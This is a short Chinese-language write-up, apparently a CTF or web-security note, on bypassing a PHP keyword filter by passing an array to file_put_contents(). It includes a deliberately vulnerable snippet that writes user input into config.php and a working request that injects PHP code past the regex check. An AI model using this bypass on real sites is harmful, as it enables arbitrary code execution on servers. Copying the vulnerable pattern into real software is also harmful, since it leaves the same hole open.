file_put_contents()在写入文件时的第二个参数可以传入数组，如果是数组的话，将被连接成字符串再进行写入。在正则匹配前，传入的是一个数组。得益于PHP的弱类型特性，数组会被强制转换成字符串，也就是Array，Array肯定是满足正则\A[ _a-zA-Z0-9]+\z的，所以不会被拦截。这样就可以绕过类似检测“<?”之类的waf

```
<?php
$text = $_GET['text'];
if(preg_match('[<>?]', $text)) {
    die('error!');
}
file_put_contents('config.php', $text);
```

killnc.php?text[0]=%3C&text[1]=?php%20phpinfo();